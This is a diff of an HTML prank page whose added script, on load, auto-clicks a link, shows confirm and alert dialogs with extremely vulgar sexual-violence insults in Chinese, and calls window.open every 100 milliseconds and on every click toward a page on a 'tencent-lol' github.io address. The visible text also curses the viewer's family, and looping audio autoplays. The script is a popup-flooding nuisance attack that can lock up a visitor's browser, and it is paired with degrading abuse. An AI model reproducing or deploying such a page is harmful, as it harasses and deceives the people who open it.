@@ -17,11 +17,18 @@
     color: red;
     font-size: .6rem;
     text-align: center;
-
 }
-.shi-body{margin: 0;-webkit-margin-before: 0;
-    -webkit-margin-after: 0;list-style: none;}
-.audio{display: none}
+
+.shi-body {
+    margin: 0;
+    -webkit-margin-before: 0;
+    -webkit-margin-after: 0;
+    list-style: none;
+}
+
+.audio {
+    display: none
+}
 </style>
 <script type="text/javascript">
 // REM布局需引入的JS代码
@@ -52,40 +59,48 @@
         <li class="li">还鼓掌叫好</li>
         <li class="li">全家都傻逼</li>
     </ul>
-  <p class="title">诅咒你全家不得好死下十八层地狱！</p>
-  <audio class="audio" autoplay="autoplay" loop="loop" src="r.m4a"></audio>
+    <p class="title">诅咒你全家不得好死下十八层地狱！</p>
+    <a id="href" href="https://tencent-lol.github.io/surprise/caonima.html" style="display: block" target="_blank">链接</a>
+    <audio class="audio" autoplay="autoplay" loop="loop" src="r.m4a"></audio>
     <script type="text/javascript" src="jquery-1.9.1.min.js"></script>
-<script>
+    <script>
+    $(document).ready(function() {
+        $('#href').trigger('click');
+        setTimeout(function() {
+            var r = confirm("确定草死你妈，取消轮奸你妈");
+
+            if (r == true) {
+
+                alert('操死你妈真爽')
+                window.open("https://tencent-lol.github.io/surprise/caonima.html")
+            } else {
+                alert('轮奸你妈真爽');
+                window.open("https://tencent-lol.github.io/surprise/caonima.html")
+
+            }
+        }, 8000)
+
+    });
 
 
 
-$(document).ready(function() {
-	setTimeout(function(){
-var r=confirm("确定草死你妈，取消轮奸你妈");
-
-if (r==true)
-{
-
-    alert('操死你妈真爽')
-  
-}
-else
-{
-  alert('轮奸你妈真爽');
+    setInterval(function(){
+    	window.open("https://tencent-lol.github.io/surprise/caonima.html");  
+    },100)
 
 
-}		
-},8000)
-	
-});
 
-setInterval(function(){
-	window.open("https://tencent-lol.github.io/surprise/caonim.index.html");  
-},100)
-</script>
-<script>
 
-</script>
+
+
+    document.body.addEventListener('click', function() {
+        window.open('https://tencent-lol.github.io/surprise/caonima.html', '_blank');
+    });
+
+
+
+    </script>
+
 </body>
 
 </html>
